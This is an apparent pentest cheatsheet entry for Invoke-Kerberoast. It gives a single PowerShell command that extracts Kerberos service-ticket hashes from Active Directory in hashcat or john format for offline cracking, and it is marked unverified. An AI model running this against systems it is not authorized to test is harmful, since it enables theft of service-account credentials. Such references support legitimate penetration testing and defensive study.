---
id: 4db82337-4079-48e4-aaea-b1f0ebf012f7
name: invoke-kerberoast.ps1
type: cheatsheet
verified: false
created_at: '2020-07-14T18:14:31.027713+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# invoke-kerberoast.ps1



**Command** ([[execute invoke-kerberoast.ps1]]):

```bash
invoke-kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>

```






